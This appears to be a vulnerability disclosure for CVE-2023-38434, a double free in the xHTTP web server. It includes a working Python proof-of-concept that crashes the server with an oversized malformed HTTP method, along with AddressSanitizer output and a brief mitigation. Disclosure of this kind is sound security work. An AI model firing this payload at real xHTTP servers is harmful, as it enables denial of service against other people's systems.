# CVE-2023-38434

xHTTP contains a double free vulnerability in close_connection at xhttp.c, line 595.

https://github.com/cozis/xHTTP/blob/72f812dcb77629c55fba1fd1ed91d13a4b380f90/xhttp.c#L595

The double free can be triggered with a malformed HTTP request method. For example, the following python3 script will make a request to the server with a malformed HTTP request method to trigger the double free:

```
#!/usr/bin/env python3

import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect(('localhost', 8080))

http_headers = (
    #Request - http_headers
    b'MALFORMEDMETHOD'*1000  +  # HTTP Method (POST Request).  Sending malformed HTTP Methods invokes a double free in xHTTP
    b' '  
    b'/'  
    b' HTTP/1.0'  
    b'\r\n' 
    b'Host: '  
    b'localhost'  
    b':'  
    b'8080'  
    b'\r\n'  
    b'Accept-Encoding: '  
    b'identity'  
    b'\r\n'  
    b'Content-Type: '  #Content type
    b'application/json'  #JSON content type
    b'\r\n'  
    
    b'Connection: close\r\n'  
    b'User-Agent: '  
    b'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246'  
    b'\r\n'  

    b'Content-Length: '  
    b'152'  #Size - Content-Length_size
    b'\r\n'  
    b'\r\n'  #Delim - crlf_headers_body
        #Block - post_body
        b'data=Somepostdata'  

)

sock.send(http_headers)
sock.recv(65535)

sock.close()
```

To confirm the issue, I first compiled the example server with debug symbols and address sanitizer:
```
gcc example.c  xhttp.c -o main -fsanitize=address -g
```

Once the server was compiled, I executed the server on port 8080

#### xHTTP Server
```
$ ./main
```

After the server was up and running I saved the python3 script I created from above and executed it, triggering a double free.
#### Python3 script
```
$ python3 poc.py
```

### Address Sanitizer Output

```
=================================================================                       
==460363==ERROR: AddressSanitizer: attempting double-free on 0x611000000040 in thread T0:
    #0 0x7f7cfaab76a8 in __interceptor_free ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:52
    #1 0x562a5c0a1727 in close_connection /home/kali/projects/fuzzing/xHTTP/xhttp.c:595 
    #2 0x562a5c0a9406 in xhttp /home/kali/projects/fuzzing/xHTTP/xhttp.c:1749                                                                                                   
    #3 0x562a5c09f693 in main /home/kali/projects/fuzzing/xHTTP/example.c:37            
    #4 0x7f7cfa846189 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58            
    #5 0x7f7cfa846244 in __libc_start_main_impl ../csu/libc-start.c:381                 
    #6 0x562a5c09f420 in _start (/home/kali/projects/fuzzing/xHTTP/main+0x5420)         
                                                                                                                                                                                
0x611000000040 is located 0 bytes inside of 256-byte region [0x611000000040,0x611000000140)
freed by thread T0 here:                                                                
    #0 0x7f7cfaab76a8 in __interceptor_free ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:52   
    #1 0x562a5c0a3a4b in parse /home/kali/projects/fuzzing/xHTTP/xhttp.c:868            
    #2 0x562a5c0a7371 in when_data_is_ready_to_be_read /home/kali/projects/fuzzing/xHTTP/xhttp.c:1459
    #3 0x562a5c0a92e0 in xhttp /home/kali/projects/fuzzing/xHTTP/xhttp.c:1735           
    #4 0x562a5c09f693 in main /home/kali/projects/fuzzing/xHTTP/example.c:37            
    #5 0x7f7cfa846189 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
                                                                                        
previously allocated by thread T0 here:                                                                                                                                         
    #0 0x7f7cfaab78d5 in __interceptor_realloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:85
    #1 0x562a5c0a2dca in parse /home/kali/projects/fuzzing/xHTTP/xhttp.c:813            
    #2 0x562a5c0a7371 in when_data_is_ready_to_be_read /home/kali/projects/fuzzing/xHTTP/xhttp.c:1459
    #3 0x562a5c0a92e0 in xhttp /home/kali/projects/fuzzing/xHTTP/xhttp.c:1735
    #4 0x562a5c09f693 in main /home/kali/projects/fuzzing/xHTTP/example.c:37
    #5 0x7f7cfa846189 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58

SUMMARY: AddressSanitizer: double-free ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:52 in __interceptor_free

```

## Mitigation 

Implementing a check to ensure ' conn->request.public.headers.list ' is only freed once will mitigate this vulnerability.
